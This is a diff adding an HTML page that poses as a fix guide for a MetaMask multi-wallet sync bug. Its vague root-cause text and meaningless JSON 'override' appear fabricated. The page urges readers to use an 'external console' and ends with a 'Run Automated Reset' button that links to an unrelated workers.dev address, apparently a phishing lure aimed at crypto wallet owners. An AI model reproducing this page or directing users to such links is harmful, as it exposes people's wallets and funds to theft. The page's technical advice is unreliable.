@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding – Fix Guide</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #cf6679; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users experience issues with Metamask extension during the Social Import onboarding process, where multiple wallets are not syncing or discovering properly, resulting in a failed import.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a bug in the Metamask extension, which fails to handle multiple wallet imports correctly, leading to a sync/discovery issue.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Delete the Metamask extension's local storage and restart the browser</li>
+<li>Reset the Metamask extension to its default settings</li>
+<li>Use the following JSON configuration to override the default sync settings:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;sync&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;wallets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;wallet1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;wallet2&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;wallet3&quot;</span><span class="p">]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider using an external console to execute these commands for more flexibility.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and enabled</li>
+<li>Multiple wallets set up and configured</li>
+<li>Social Import onboarding process initiated</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
